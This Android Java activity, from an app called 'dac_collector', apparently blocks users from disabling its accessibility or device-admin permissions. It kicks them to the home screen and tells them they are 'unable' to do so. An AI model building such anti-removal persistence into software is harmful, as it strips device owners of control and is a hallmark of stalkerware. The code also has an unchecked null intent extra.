package android.iocl.dac_collector.Ui;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.iocl.dac_collector.R;
import android.os.Bundle;
import android.widget.TextView;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.app.AlertDialog;

public class DialogActivity extends AppCompatActivity {

    TextView messageTV, go_home;

    String msgTxt = "def";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.disable_app_uninstallation);
        messageTV = findViewById(R.id.tv_relative_txt);

        go_home = findViewById(R.id.go_home);

        // Call this where you want to go back programmatically
        onBackPressed();


        goToHomePage(this);


        String message = getIntent().getStringExtra("key_string");


        if (message.toLowerCase().equals("accessibility")){

            msgTxt = "You're Unable to Disable App Accessibility";

        }else if (message.toLowerCase().equals("device_admin")){
            msgTxt = "You're Unable to Disable App Admin";
        }else {
            msgTxt = "Your Action is Declined";
        }

        messageTV.setText(msgTxt);


        go_home.setOnClickListener(v -> {
            goToHomePage(this);
        });
    }

    public void goToHomePage(Context context) {
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent);
    }




}
